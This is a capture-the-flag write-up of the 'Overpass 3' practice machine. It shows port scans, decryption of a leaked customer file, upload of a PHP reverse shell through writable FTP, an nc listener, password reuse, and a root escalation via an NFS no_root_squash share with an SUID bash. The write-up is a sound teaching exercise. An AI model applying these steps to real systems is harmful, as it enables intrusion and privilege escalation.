# Overpass 3
difficulty: Medium

<img src="overpass3.png" width=200 alt="overpass3">

## Enumeration

### rustscan + nmap

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3

22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfSHQR3OtIeAUFx18phN/nfAIQ2uGHuJs0epoqF184E4Xr8fkjSFJHdA6GsVyGUjdlPqylT8Lpa+UhSSegb8sm1So8Nz42bthsftsOxMQVb/tpQzMUfjcxQOiyVmgxfEqs2Zzdv6GtxwgZWhKHt7T369ejxnVrZhn0m6jzQNfRhVoQe/jC20RKvBf8l8s6/SusbZR5SFfsg71KyrSKOXOxs12GhXkdbP32K3sXVEpWgfCfmIZAc2ZxNtL5uPCM4AOfjIFJHl1z9EX04ZjQ1rMzzOh9pD/b+W2mXt2nQGzRPnc8LyGDE0hFtw4+lBCoiH8zIt14S7dwbFFV1mWxbtZXVf7JhPiZDM2vBfqyowsDZ5oc2qyR+JEU4pqeVhRygs41isej/el19G8+ehz4W07KR97eM2omB25JehO7E4tpX1l8Imjs1XjqhhVuGE2tru/p62SRQOKzRZ19MCIFPxleSLorrHq/uuKdvd8j6rm0A9BrCsiB6gmPfal6Kr55vlU=
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPAji9Nkb2U9TeP47Pz7BEa943WGOeu5XrRrTV0+CS0eGfNQyZkK6ZICNdeov65c2NWFPFsZTFjO8Sg+e2n/lM=
|   256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/U6Td7C0nC8tiqS0Eejd+gQ3rjSyQW2DvcN0eoMFLS

80/tcp open  http    syn-ack Apache httpd 2.4.37 ((centos))
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Overpass Hosting
|_http-server-header: Apache/2.4.37 (centos)
Service Info: OS: Unix

```
### gobuster

```
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/backups              (Status: 301) [Size: 236] [--> http://10.10.165.80/backups/]
/cgi-bin/             (Status: 403) [Size: 217]                                   
/index.html           (Status: 200) [Size: 1770] 
```

We obviously grab the backup files

There is a gpg encrypted "customers details" file with the key

I imported and decrypted it to .xlsx

```
└──╼ $gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: chiffré avec une clef RSA de 2048 bits, identifiant 9E86A1C63FB96335, créée le 2020-11-08
      « Paradox <paradox@overpass.thm> »
```
I then open the excel file with `libreoffice`

I got 3 users with their passwords, now where should I use those?

ssh you say? oh sweet summer child...

why would they make ftp available then? we need to suffer more

One of them worked for ftp (only one)

```
└──╼ $ftp 10.10.165.80
Connected to 10.10.165.80.
220 (vsFTPd 3.0.3)
Name: [REDACTED]
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
```
ftp> ls -al
227 Entering Passive Mode (10,10,165,80,184,129)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
```
No interresting file but look at the permissions

I did a similar exploitation before so it was obvious for me

Note how we have full permission (especially write) on the current directory

plus the file structure is similar to the website so it's exposed


## Exploitation

We just need to add a php reverse shell

```
ftp> put shell.php
local: shell.php remote: shell.php
227 Entering Passive Mode (10,10,165,80,57,250)
150 Ok to send data.
226 Transfer complete.
3909 bytes sent in 0.00 secs (52.5058 MB/s)
```
visit the page corresponding to our shell

Don't forget to prepare a listenner first

Now we are in!

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 35606
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:52:23 up  2:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (870): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```

First a bit of stability and quick enumeration

```
sh-4.4$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$ whoami
whoami
apache
```
Then get denied user access

```
cd paradox
bash: cd: paradox: Permission denied
bash-4.4$ cd james
cd james
bash: cd: james: Permission denied
```
Hehe that good old james

Ok let's look around those web files

I just used the find command to hopefully get the flags locations and guess what...

```
bash-4.4$ find / -name *flag* 2>/dev/null
find / -name *flag* 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/vif-0/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/bin/pflags
/usr/sbin/grub2-set-bootflag
/usr/share/man/man1/grub2-set-bootflag.1.gz
/usr/share/httpd/web.flag
```
It fricking worked! 

Look how they despicably hid the web flag

```
bash-4.4$ cat /usr/share/httpd/web.flag
cat /usr/share/httpd/web.flag
thm{real_web_flag_here_true}
```
Now we need to switch to an user! 

## Privilege escalation

We got only two: james and paradox

I remember paradox was one of the website user, he might reuse his password

```
bash-4.4$ su paradox
su paradox
Password: [REDACTED]
[paradox@localhost ~]$ ls -al
ls -al
total 56
drwx------. 4 paradox paradox   203 Nov 18  2020 .
drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
drwx------  2 paradox paradox    47 Nov 18  2020 .ssh
```
And it worked! we are paradox now!

No flag or any useful file in his messy folder  

I tried `sudo -l` but paradox is not a sudoer

Next is finding SUID

```
[paradox@localhost html]$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/crontab
/usr/sbin/grub2-set-bootflag
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```
Ok nothing too obvious at first but that suid on `/usr/sbin/mount.nfs` 

a bit unnecessary, therefore suspicious if you ask me

gtfobins said "I don't know" but google said "[HOL' UP!](https://steflan-security.com/linux-privilege-escalation-exploiting-nfs-shares/) [I'VE SEEN IT BEFORE](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)"

The thing is that nmap did not see any nfs port open (showmount -e will timeout)

```
[paradox@localhost html]$ netstat -tunlp
netstat -tunlp
bash: netstat: command not found
[paradox@localhost ~]$ rpcinfo -p
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  20048  mountd
    100005    1   tcp  20048  mountd
    100005    2   udp  20048  mountd
    100005    2   tcp  20048  mountd
    100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100024    1   udp  36676  status
    100024    1   tcp  52307  status
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    1   udp  39930  nlockmgr
    100021    3   udp  39930  nlockmgr
    100021    4   udp  39930  nlockmgr
    100021    1   tcp  36795  nlockmgr
    100021    3   tcp  36795  nlockmgr
    100021    4   tcp  36795  nlockmgr
```
You can also use the noisy `linpeas` to confirm that

They dont have wget installed too so you have to use ftp again!

```
╔══════════╣ NFS exports?
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)

```

In conclusion nfs is definitelly installed but running locally (Port 2049)!

We might need to port forward that! 

I usually use ssh for that so let's drop keys using ssh-keygen

Grab the private, add the public to authorized, set permissions...you know the drill

Now the port forwarding! (I googled for the right command syntax)

```
└──╼ $ssh paradox@10.10.165.80 -i id_rsa -L 2049:localhost:2049
Last login: Sat Apr 16 03:32:51 2022 from 10.8.226.203
[paradox@localhost ~]$ 
```
Now we can mount the point on our machine

```
└──╼ $sudo mount -v -t nfs localhost:/ /mnt/TempNFS
[sudo] Mot de passe de nairolf : 
mount.nfs: timeout set for Sat Apr 16 03:46:16 2022
mount.nfs: trying text-based options 'vers=4.2,addr=::1,clientaddr=::1'
```

It's james folder! we got the user flag and his ssh key

Ok now let's get root! 

if you read the articles google provided you would understand the next part

This is from the mounted folder (doing as root is vital here, so I use sudo):

```
└──╼ $sudo cp /bin/bash .

└──╼ $sudo chmod +s bash

└──╼ $ls
bash  user.flag
```
Then this is on the remote, after connecting as james:

```
[james@localhost ~]$ ls
bash  user.flag
[james@localhost ~]$ ./bash -p
./bash: /lib64/libtinfo.so.6: no version information available (required by ./bash)
bash-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groupes=0(root),1000(james)
```
and it's done! we are root!

```
bash-5.1# cd /root
bash-5.1# ls
root.flag
bash-5.1# cat root.flag
thm{grind_brother_always_grind}
```

I enjoyed the privilege escalation in this room alot!

Overpass series got very good rooms, but this one is the best!

